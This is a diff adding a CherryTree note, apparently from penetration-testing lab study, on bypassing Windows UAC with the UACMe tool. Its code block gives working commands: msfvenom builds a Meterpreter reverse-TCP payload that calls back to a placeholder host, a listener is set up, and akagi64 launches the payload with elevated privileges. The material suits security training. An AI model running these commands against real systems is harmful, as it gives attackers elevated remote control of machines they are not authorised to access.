@@ -1,0 +1,29 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="Bypass UAC" unique_id="20" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704144543" ts_lastsave="1704144704">
+    <rich_text>UACMe is the tool we plan to use for this.
+
+</rich_text>
+    <rich_text link="webs https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</rich_text>
+    <rich_text>
+
+Can be used to escalate priveleges or change a user's password by bypassing UAC.
+
+Requires a user account that is already a user in the local administrator's group. UAC has verious integrity levels from Low to High. Programs can be executed with elevated privs without prompting the use for confirmation.
+
+UAC depends on the version of windows, and the level of integrity applied to UAC.
+
+UACMe is a tool and list of resources that can be used to bypass UAC. We will be using primarily akagi32
+
+**Practical notes**
+
+Confirm you are in local administrators group.
+
+
+NOTE FROM LABS: Always try to upgrade your shell to 64 bit on 64 bit computers.
+</rich_text>
+    <codebox char_offset="642" justification="left" frame_width="713" frame_height="55" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip.addr LPORT=1337 -f exe &gt; shell.exe
+use multi/handler #configure multi/handler
+.\akagi64.exe ( number ) c:\Temp\shell.exe</codebox>
+  </node>
+</cherrytree>
